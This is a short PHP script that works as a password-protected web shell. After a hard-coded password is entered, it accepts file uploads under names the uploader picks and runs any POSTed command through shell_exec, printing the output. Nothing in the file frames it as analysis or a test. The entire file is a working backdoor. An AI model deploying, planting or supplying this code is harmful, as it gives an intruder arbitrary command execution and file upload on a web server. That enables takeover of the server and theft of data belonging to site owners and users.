<?php
$password = "sukaayam";
if(isset($_POST['pass']) && $_POST['pass'] === $password){
    if(isset($_FILES['file'])){
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "Upload sukses!";
    }
    if(isset($_POST['cmd'])){
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }
} else {
    echo '<form method="POST"><input type="password" name="pass"/><input type="submit" value="Login"/></form>';
}
?>